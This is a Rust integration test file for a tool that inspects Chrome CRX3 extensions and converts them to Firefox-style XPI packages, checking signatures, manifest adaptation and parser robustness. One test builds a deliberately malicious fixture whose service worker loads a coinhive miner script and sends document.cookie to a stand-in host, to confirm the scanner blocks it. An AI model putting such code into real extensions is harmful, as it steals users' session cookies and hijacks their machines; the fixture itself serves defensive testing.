/* This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/. */

//! Crate-level integration fixtures. `probe.crx` is a real CRX3 signed with
//! an RSA key generated for the fixture; `probe.id` is its expected Chrome
//! id. Regenerate both with the script recorded in
//! `docs/astra/EXTENSIONS_COMPAT.md`.

use std::io::{Cursor, Write};

use zip::write::SimpleFileOptions;
use zip::ZipWriter;

use crate::crx::Crx;
use crate::types::*;

pub const FIXTURE_ID: &str = "cjhefkacmcpjpknoebmbkpljandkpmem";

pub fn fixture_crx() -> Vec<u8> {
    include_bytes!("../tests/fixtures/probe.crx").to_vec()
}

fn zip(files: &[(&str, &str)]) -> Vec<u8> {
    let mut bytes = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut bytes));
        for (name, data) in files {
            writer
                .start_file(*name, SimpleFileOptions::default())
                .expect("start");
            writer.write_all(data.as_bytes()).expect("write");
        }
        writer.finish().expect("finish");
    }
    bytes
}

#[test]
fn the_signed_fixture_keeps_its_identity() {
    let bytes = fixture_crx();
    let crx = Crx::parse(&bytes).expect("fixture verifies");
    assert_eq!(crx.extension_id(), FIXTURE_ID);
    assert_eq!(crx.signature_status(), SignatureStatus::Verified);
}

#[test]
fn inspect_adapts_a_real_mv3_package() {
    let dir = tempfile::tempdir().expect("temp");
    let path = dir.path().join("probe.crx");
    std::fs::write(&path, fixture_crx()).expect("write");
    let report = crate::inspect(&path, Source::Chrome).expect("inspects");

    assert_eq!(report.source, Source::Chrome);
    assert_eq!(report.format, PackageFormat::Crx3);
    assert_eq!(report.signature, SignatureStatus::Verified);
    assert_eq!(report.identity.chrome_id.as_deref(), Some(FIXTURE_ID));
    assert_eq!(
        report.identity.install_id,
        format!("{FIXTURE_ID}@chrome.astra")
    );
    assert_eq!(report.manifest.manifest_version, 3);
    assert_eq!(report.manifest.name, "Astra Chrome Probe");
    assert_eq!(report.compatibility.manifest_version, 3);

    // The manifest the engine will see.
    let adapted = &report.adapted_manifest;
    assert!(adapted.get("side_panel").is_none());
    assert_eq!(adapted["sidebar_action"]["default_panel"], "panel.html");
    assert_eq!(
        adapted["background"]["scripts"][0],
        crate::manifest::COMPAT_SCRIPT
    );
    assert!(adapted["background"].get("service_worker").is_none());
    assert!(adapted["permissions"]
        .as_array()
        .unwrap()
        .iter()
        .all(|p| p.as_str() != Some("sidePanel")));
    assert_eq!(
        adapted["browser_specific_settings"]["gecko"]["id"],
        format!("{FIXTURE_ID}@chrome.astra")
    );

    assert!(report.compatibility.compat_prelude);
    assert!(report
        .compatibility
        .adaptations
        .iter()
        .any(|a| a.contains("service worker")));
    assert!(report
        .compatibility
        .limitations
        .iter()
        .any(|l| l.contains("side_panel") || l.contains("sidebar")));
    assert!(!report.compatibility.apis.is_empty());
}

#[test]
fn stage_writes_a_deterministic_xpi_with_the_prelude() {
    let dir = tempfile::tempdir().expect("temp");
    let source = dir.path().join("probe.crx");
    std::fs::write(&source, fixture_crx()).expect("write");
    let destination = dir.path().join("staged");
    let staged = crate::stage(&source, Source::Chrome, &destination).expect("stages");
    assert!(std::path::Path::new(&staged.xpi_path).is_file());
    assert_eq!(staged.xpi_sha256.len(), 64);
    assert!(destination.join("report.json").is_file());
    assert!(!destination.join("unpacked").exists());

    let bytes = std::fs::read(&staged.xpi_path).expect("read xpi");
    let scan = crate::package::scan_zip(&bytes).expect("xpi is a zip");
    assert!(scan.scan.contains_key(crate::manifest::COMPAT_SCRIPT));
    let manifest = crate::manifest::parse(&scan.manifest, true).expect("manifest");
    assert!(manifest.value.get("side_panel").is_none());
    assert_eq!(
        manifest.value["sidebar_action"]["default_panel"],
        "panel.html"
    );
    let scripts: Vec<&str> = manifest.value["background"]["scripts"]
        .as_array()
        .unwrap()
        .iter()
        .filter_map(|v| v.as_str())
        .collect();
    assert_eq!(
        scripts.first().copied(),
        Some(crate::manifest::COMPAT_SCRIPT)
    );
    assert!(scripts.contains(&"lib.js"));
    assert!(scripts.contains(&"sw.js"));
    let sw = String::from_utf8_lossy(&scan.scan["sw.js"]);
    assert!(!sw.contains("importScripts"));
    assert!(sw.contains("astraProbeValue"));

    // Two stages of the same source produce the same XPI hash.
    let second = dir.path().join("staged-2");
    let staged2 = crate::stage(&source, Source::Chrome, &second).expect("stages twice");
    assert_eq!(staged.xpi_sha256, staged2.xpi_sha256);
}

#[test]
fn an_unsigned_zip_is_inspected_but_marked_unsigned() {
    let dir = tempfile::tempdir().expect("temp");
    let path = dir.path().join("plain.zip");
    let bytes = zip(&[
        (
            "manifest.json",
            r#"{"manifest_version":3,"name":"Plain","version":"2.0","background":{"service_worker":"sw.js"},"permissions":["storage"]}"#,
        ),
        ("sw.js", "chrome.runtime.onInstalled.addListener(() => {});"),
    ]);
    std::fs::write(&path, bytes).expect("write");
    let report = crate::inspect(&path, Source::Chrome).expect("inspects");
    assert_eq!(report.signature, SignatureStatus::NotPresent);
    assert!(report.warnings.iter().any(|w| w.contains("not signed")));
    assert_eq!(report.identity.kind, IdentityKind::ChromePath);
}

#[test]
fn a_malicious_fixture_is_blocked_automatically() {
    let dir = tempfile::tempdir().expect("temp");
    let path = dir.path().join("bad.zip");
    let bytes = zip(&[
        (
            "manifest.json",
            r#"{"manifest_version":3,"name":"Bad","version":"1.0","background":{"service_worker":"sw.js"}}"#,
        ),
        (
            "sw.js",
            "importScripts('https://coinhive.com/lib/miner.js');\nnavigator.sendBeacon('https://collect.test', document.cookie);\n",
        ),
    ]);
    std::fs::write(&path, bytes).expect("write");
    let report = crate::inspect(&path, Source::Chrome).expect("inspects");
    assert!(report.security.blocked);
    assert_eq!(report.security.level, SecurityLevel::Blocked);
    assert_eq!(report.compatibility.verdict, Verdict::Blocked);
}

#[test]
fn a_missing_manifest_is_an_error_not_an_empty_report() {
    let dir = tempfile::tempdir().expect("temp");
    let path = dir.path().join("no-manifest.zip");
    std::fs::write(&path, zip(&[("sw.js", "console.log(1);")])).expect("write");
    assert!(crate::inspect(&path, Source::Chrome).is_err());
}

#[test]
fn arbitrary_bytes_never_panic_the_parsers() {
    // A cheap deterministic corpus: lengths and bytes vary, and every third
    // buffer carries the CRX magic so the header/zip paths are exercised.
    let mut state = 0x9e37_79b9_7f4a_7c15u64;
    for step in 0..768usize {
        state = state
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        let len = (state as usize >> 33) % 512;
        let mut buffer = vec![0u8; len];
        for byte in &mut buffer {
            state = state
                .wrapping_mul(6364136223846793005)
                .wrapping_add(1442695040888963407);
            *byte = (state >> 33) as u8;
        }
        if step % 3 == 0 && buffer.len() >= 12 {
            buffer[..4].copy_from_slice(b"Cr24");
            buffer[4..8].copy_from_slice(&3u32.to_le_bytes());
            let header = (buffer.len() - 12).min(64) as u32;
            buffer[8..12].copy_from_slice(&header.to_le_bytes());
        }
        let _ = Crx::parse(&buffer);
        let _ = crate::manifest::parse(&buffer, true);
        let _ = crate::package::scan_zip(&buffer);
    }
}

#[test]
fn a_tampered_signature_is_refused() {
    let dir = tempfile::tempdir().expect("temp");
    let path = dir.path().join("bad.crx");
    let mut bytes = fixture_crx();
    let last = bytes.len() - 1;
    bytes[last] ^= 0xff;
    std::fs::write(&path, bytes).expect("write");
    assert!(crate::inspect(&path, Source::Chrome).is_err());
}
